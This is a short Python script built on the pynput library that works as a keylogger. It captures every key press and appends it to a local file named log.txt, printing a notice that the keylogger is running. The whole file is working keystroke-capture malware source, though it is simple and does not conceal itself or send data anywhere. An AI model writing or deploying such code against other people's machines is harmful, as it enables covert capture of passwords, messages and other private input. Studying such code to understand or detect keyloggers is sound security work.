from pynput.keyboard import Listener


def log_keystroke(key):
    key = str(key).replace("'", "")
    with open("log.txt", "a") as log_file:
        log_file.write(key + "\n")

def start_logging():
    with Listener(on_press=log_keystroke) as listener:
        listener.join()


if __name__ == "__main__":
    print("[+] Keylogger is running...  (press CTRL + C to stop)")
    start_logging()